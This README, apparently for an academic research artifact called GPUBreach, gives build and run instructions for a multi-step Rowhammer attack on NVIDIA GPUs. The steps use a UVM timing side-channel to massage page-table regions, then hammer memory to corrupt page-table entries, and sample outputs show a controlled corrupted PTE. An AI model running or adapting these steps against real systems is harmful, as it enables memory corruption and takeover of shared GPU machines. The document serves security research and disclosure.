# GPUBreach

## Required Environment
**Run-time Environment:**  We suggest using a Linux distribution compatible with g++-11 or newer.

- Software Dependencies:
   - CMake 3.22+
   - g++ with C++17 Support
   - NVIDIA CUDA Driver
   - NVIDIA CUDA Toolkit
   - NVIDIA System Management Interface `nvidia-smi`

- Hardware Dependencies:
   - NVIDIA GPU sm_80+

### Reference Environment
Our reference system:

- OS: Ubuntu 22.04.5 LTS
- CPU: AMD Ryzen Threadripper PRO 5945WX 12-Cores
- GPU: NVIDIA RTX A6000 (48 GB GDDR6, sm_80)
- Driver: NVIDIA Driver 545.23.08 (includes nvidia-smi)
- CUDA Toolkit: 12.3
- Compiler: g++ 11.4.90 with C++17 support

### Setup Step for Current Project (Due to some hardcodings...)
1. Change `const size_t RH_LIMIT` in `src/include/sc_util.cuh` following the comment on the variable.
2. Change `auto last_hammer_page` in `src/sc_firstRegion.cu` following the comment on the variable.

## Project Structure

```txt
.
📂 /src
│
├── 📂 /include: contains the core code to launch GPUHammer and utils for GPUBreach massaging
│   └── 📄 rh_*: Directly ported from GPUHammer to launch Rowhammer with minimal amount of code.
│   └── 📄 sc_util.cu/h: CUDA Kernels and utility C++ functions for massaging.

├── 📄 CMakeList.txt
├── 📄 sc_main.cu: main function to run different steps of GPUBreach.
├── 📄 sc_allocallmem.*: Step 1 of GPUBreach, using UVM timing side-channel to get system memory limit.
|
├── 📄 sc_firstRegion.*: Step 2 of GPUBreach, using UVM timing side-channel and 4KB page tables to massage PT regions to flippy locations.
|
├── 📄 sc_firstRegion_hammer.*: Step 3 of GPUBreach, fill new PT region with PTEs and perform GPUHammer. Repeated multiple times on random PTEs if corruption not observed.
|
└── 📄 sc_secondRegion.*: Step 4 of GPUBreach, same as sc_firstRegion.
```

## Basic Steps to Run & Perform GPUBreach Steps

### Step 0. Compile
```bash
cmake -S ./src -B ./src/out/
cd ./src/out/
make
```

### Step 1. Fill GPU Memory
Given different GPUs may have different timing, we run the following to get a sense of the timing spike:

```bash
BREACH_DEBUG=1 ./sc_main all_mem_test 0.2 15
```

where `BREACH_DEBUG` is the environment variable for timing debug messages, `0.2` is 0.2ms which we classify any time above this **threshold** a timing spike, and `15` is how many initial measurements to **skip**, given usually the first few measurements take longer when GPU is warming up.

In general, this **threshold** should be correct and you will see:
```txt
24181 Recorded time: 0.095685 ms
24182 Recorded time: 0.098028 ms
24183 Recorded time: 0.096506 ms
24184 Recorded time: 0.370845 ms
24185 Recorded time: 0.367038 ms
24186 Recorded time: 0.323674 ms
Spikes observed after allocation index **24184**
This means you should perform at most **24184** number of allocations to avoid eviction
Pass **24184** as the limit in subsequent experiments.
```

If not, inspect the output of the time to observe **consecutive timing spikes** and see what is your GPU's eviction timing threshold.

You can then run this command to control the number of allocations, which is what the future steps will use.
```bash
BREACH_DEBUG=1 ./sc_main all_mem_test 24184 0.2 15
```
The output should stop at 24183, as this is the maximum memory. If you increase this number, you should expect to see the same behavior as before.

### Step 2. Massaging PT Region
Taking the number we found from **Step 1**, we use it to perform the massaging step. We will test that the timing side-channel with 4KB pages works as intended by running the test command below:

```bash
BREACH_DEBUG=1 ./sc_main first_region_test 24184 0.2 15
```

The final output should not be longer than 1024, as we generate PT regions very fast. If it is going longer, your **threshold** may be too high, lower it or see below how it is supposed to behave:

```txt
...
316 New PT time: 0.024847 ms
317 New PT time: 0.024817 ms
318 New PT time: 0.247276 ms
Found First Allocation Spike: **318**., Time:  0.247276.
Next Allocation Spike Id:  **826**.

...
824 New PT time: 0.024828 ms
825 New PT time: 0.02575 ms
826 New PT time: 0.242807 ms
Expected: id **826**. Found Spike id: **826**.
```

There are no direct way to verify whether the massaging worked directly after this point. However, if one have a page table dumper installed like `https://github.com/0x5ec1ab/gpu-tlb/tree/main/extractor`, you can check whether a PT region is resident where you expect it to.

Run:
```bash
BREACH_DEBUG=1 ./sc_main first_region 24184 0.2 15
```

```txt
821 New PT time: 0.022894 ms
822 New PT time: 0.035759 ms
(Step 2 Success) First PT Region Generated: Press Enter Key to continue...
```

and run the dumper after you reach this stage, of which the program will stall unless you hit ENTER one more time.

### Step 3: 

Once you believe (or verified) the massaging is working as intended, we now will move to filling the PT region with PTEs and hammer it. The current program simply fills the PT region adhocly by filling the entire memory again as we will need this anyway in **Step 4** (but with 64KB pages instead of 2MB). 

To get the new memory limit after our massaging/**Step 2**, run this command and follow the same procedure as **Step 1**, and tune the **threshold** if needed. 
```bash
BREACH_DEBUG=1 ./sc_main first_region_atk_mem_test 24184 0.2 15
```
It should be a slightly lower number than **Step 1**, and run multiple times if needed to verify that this occurs consistently:
```txt
Test Step 3:
Filling Memory to Full Again

Spikes observed after allocation index 24145
This means you should perform at most 24145 number of allocations to avoid eviction
Pass 24145 as the limit in subsequent experiments.
```

Now we can see whether our attack really worked:

```bash
BREACH_DEBUG=1 ./sc_main first_region_atk 24184 24145 0.2 15
```

> NOTE 1: Given this requires actual flips in the system, the current Rowhammer is hard coded and likely won't work. We will give what it is suppose to look like from our machine.

> NOTE 2: Alternatively, you can use gpu-tlb dumper to manually modify the PTE and simulate. Given we have not directly connected gpu-tlb to the workflow, you will need to manually inspect the virtual addresses to modify them. 

On our machine, after 1 retry, we get a corrupted PTE that we control.
```txt
Start Step 3
Filling Memory to Full Again (Consequently the First PT Region) 

First PT Region Filled Round 0 Completed
Filling In Identifing Information for Each Page... 
Identifing Data Placed, Hammer Starts...
Hammer Done
No Corruption Found, Retrying...

First PT Region Filled Round 1 Completed
Filling In Identifing Information for Each Page... 
Identifing Data Placed, Hammer Starts...
Hammer Done
Corrupted: 7724 0x7f9ff82e0000. Victim: 0x7f9ff72e0000
(Step 3 Success) Found Corrupted PFN Destination: Press Enter Key to continue...
```

### Step 4: 
This step is not interesting as it does the same thing as **Step 2**.Here is how you run it and you can verify with a memory dumper that the new PT region lies in the Victim Page from **Step 3** after it finishes:

```
BREACH_DEBUG=1 ./sc_main second_region 24184 24145 0.2 15
```